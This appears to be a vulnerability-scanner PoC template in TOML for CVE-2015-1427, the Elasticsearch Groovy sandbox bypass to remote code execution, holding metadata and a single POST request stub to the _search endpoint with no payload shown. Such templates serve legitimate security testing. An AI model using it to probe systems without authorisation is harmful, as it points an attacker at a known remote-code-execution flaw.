[info]
author = "ave"
description = "AVE-2015-0009 Groovy 沙箱绕过导致远程代码执行 PoC"
id = "POC-AVE-2015-0009"
name = "CVE-2015-1427 Elasticsearch Groovy Sandbox Bypass PoC"
severity = "high"
tags = [
    "cve-2015-1427",
    "elasticsearch",
    "groovy",
    "rce",
]
vuln_id = [
    "CVE-2015-1427",
    "AVE-2015-0009",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/_search"
